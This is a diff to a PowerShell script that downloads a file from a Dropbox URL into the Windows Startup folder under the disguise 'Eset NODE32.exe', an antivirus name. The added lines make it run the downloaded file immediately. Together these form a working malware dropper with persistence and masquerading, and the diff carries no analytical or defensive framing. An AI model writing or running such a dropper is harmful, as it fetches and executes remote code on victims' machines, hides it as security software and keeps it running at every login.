@@ -7,14 +7,17 @@ $fileName = [System.IO.Path]::GetFileName($dropboxUrl)
 
 $fileName = $fileName -replace '[\\/:*?"<>|]', '-'
 
+
 $startupFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Startup"), "Eset NODE32.exe")
 
 
 Invoke-WebRequest -Uri $dropboxUrl -OutFile $startupFolder
 
-
 if (Test-Path $startupFolder) {
     Write-Host "File downloaded and placed in the startup folder with the name: $fileName"
+    
+
+    Start-Process -FilePath $startupFolder -Wait
 } else {
     Write-Host "Download failed."
 }
